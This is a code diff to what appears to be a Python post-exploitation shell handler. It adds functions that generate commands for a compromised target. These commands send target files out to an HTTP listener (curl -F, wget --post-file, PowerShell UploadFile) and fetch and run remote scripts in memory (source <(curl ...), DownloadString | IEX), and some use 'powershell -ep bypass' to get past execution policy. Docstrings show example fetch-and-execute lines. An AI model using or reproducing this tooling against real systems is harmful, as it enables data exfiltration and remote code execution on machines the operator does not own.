@@ -31,6 +31,19 @@ class SessionExec(object):
             hide_error=False,
             shell_type=None
         ):
+        """
+        Exec a command and return the string result stripped
+        When get_all is True this function try to recover the whole result through delimiters
+        
+        Example:
+        ```sh
+        $ echo "=====" ; whoami ; echo "====="
+        =====
+        kali
+        =====
+        ```
+
+        """
 
         self.is_waiting = True
 
@@ -122,38 +135,15 @@ class SessionExec(object):
 
     def upload_http(self, http_link, where, shell_type, available_bin):
         cmd = self.maker.with_shell_type(shell_type).download_from(http_link, where, available_bin).end().get_command()
-        self.exec(cmd, timeout=2, shell_type=shell_type)
+        self.exec_no_result(cmd, shell_type=shell_type)
 
-    def download(self, file, download_directory, shell_type, available_bin):
-        self.maker.init_command(file).with_shell_type(shell_type)
-        file_content = b""
-        if(shell_type in [ShellTypes.Basic, ShellTypes.Pty]):
-            if('base64' in available_bin):
-                b64_file_content = self.download_base64(file, shell_type)
-                file_content = base64.b64decode(b64_file_content.encode())
+    def download(self, http_link, file, shell_type, available_bin):
+        cmd = self.maker.with_shell_type(shell_type).upload_file(http_link, file, available_bin).end().get_command()
+        self.exec_no_result(cmd, shell_type=shell_type)
 
-            elif('xxd' in available_bin):
-                hex_file_content = self.download_hex(file, shell_type)
-                file_content = bytes.fromhex(hex_file_content.replace("\n", ""))
-
-        else:
-            if("download" in available_bin):
-                hex_file_content_powershell = self.exec(f'download "{file}"', timeout=2.5, get_all=True)
-                file_content = bytes.fromhex(hex_file_content_powershell)
-                
-            else:
-                Printer.err("[i]download[/i] function is [red]not available[/red] on target")
-
-        if(file_content != b""):
-            destination = join(download_directory, basename(file))
-            Printer.msg(f"Saving file in [dodger_blue1]{destination}[/dodger_blue1]")
-
-            with open(destination, 'wb') as f:
-                f.write(file_content)
-
-        else:
-            Printer.err(f"No result found for file [dodger_blue1]{file}[/dodger_blue1]")
-
+    def load(self, http_link, shell_type, available_bin):
+        cmd = self.maker.with_shell_type(shell_type).load_script(http_link, available_bin).end().get_command()
+        self.exec_no_result(cmd, shell_type=shell_type)
 
     def download_hex(self, file, shell_type):
         cmd = self.maker.to_hex().get_command()
@@ -251,11 +241,24 @@ class CmdMaker:
         return self
 
     def download_from(self, http_link, where, available_bin):
+        """
+        Download the file named "file" from the link "http_link"
+        """
         if(CmdUtils.is_download_available(self.shell_type, available_bin)):
             self._cmd = CmdUtils.get_command_for_download(self.shell_type, http_link, where, available_bin)
         else:
             raise Exception("Cannot download via http, use file write")
 
+        return self
+
+    def upload_file(self, http_link, file, available_bin):
+        """Upload a file to http_link which is a minishh url"""
+        self._cmd = CmdUtils.get_command_for_upload(self.shell_type, http_link, file, available_bin)
+        return self
+
+    def load_script(self, http_link, available_bin):
+        """Load a script in the current process memory"""
+        self._cmd = CmdUtils.get_command_for_load(self.shell_type, http_link, available_bin)
         return self
 
 class CmdUtils:
@@ -311,6 +314,22 @@ class CmdUtils:
                 output = f"({command}) > {filename}"
             return output
 
+    @staticmethod
+    def get_command_for_upload(shell_type, http_link, file, available_bin):
+        if(shell_type is ShellTypes.Powershell):
+            return f'(New-Object System.Net.WebClient).UploadFile("{http_link}", "{file}")'
+
+        elif(shell_type is ShellTypes.Windows):
+            return f'powershell -ep bypass -c "(New-Object System.Net.WebClient).UploadFile(\\"{http_link}\\", \\"{file}\\");"'
+
+        if("curl" in available_bin):
+            return f"curl -s -F 'minishh_dl=@{file}' '{http_link}'"
+        
+        elif("wget" in available_bin):
+            return f"wget -O - --post-file '{file}' '{http_link}'"
+
+        else:
+            raise Exception("No binaries found for download")
 
     @staticmethod
     def get_command_for_download(shell_type, http_link, where, available_bin):
@@ -319,7 +338,7 @@ class CmdUtils:
 
         elif(shell_type is ShellTypes.Windows):
             if("curl" in available_bin):
-                return f'curl "{http_link}" -o "{where}"'
+                return f'curl -s "{http_link}" -o "{where}"'
             return f'powershell -ep bypass -c "(new-object system.net.webclient).downloadfile(\\"{http_link}\\", \\"{where}\\");"'
 
         else:
@@ -330,7 +349,43 @@ class CmdUtils:
                 return f"curl '{http_link}' -o {where}"
 
             else:
-                raise Exception("No binaries found for download, despite the download seems available")
+                raise Exception("No binaries found for download, despite the download")
+
+    @staticmethod
+    def get_command_for_load(shell_type, http_link, available_bin):
+        """
+        Return the command to load a script in memory
+        Example in bash:
+        ```bash
+        $ echo 'alias os="uname -a"' > alias.sh && python3 -m http.server 8080 &
+        $ os
+        os: command not found
+        
+        $ source <(curl "http://127.0.0.1:8080/alias.sh") && kill %1
+        $ os
+        Linux kali ... GNU/Linux
+        ```
+
+        ```python3
+        > CmdUtils.get_command_for_load(ShellTypes.Basic, 'http://127.0.0.1:9001/dnjkznker.log')
+        source <(curl "http://127.0.0.1:9001/dnjkznker.log")
+        > ^D
+        ```
+        """
+        if shell_type is ShellTypes.Powershell:
+            return f'(New-Object System.Net.WebClient).DownloadString("{http_link}") | IEX'
+
+        elif shell_type is ShellTypes.Basic:
+            if "curl" in available_bin:
+                return f'source <(curl -s "{http_link}")'
+
+            elif "wget" in available_bin:
+                return f'source <(wget -q -O - "{http_link}")'
+
+            else:
+                raise Exception("No binaries found for download")
+
+        raise NotImplementedError("Load function cannot be used for the shell type you currently have")
 
     @staticmethod
     def file_to_base64(filename, shell_type):
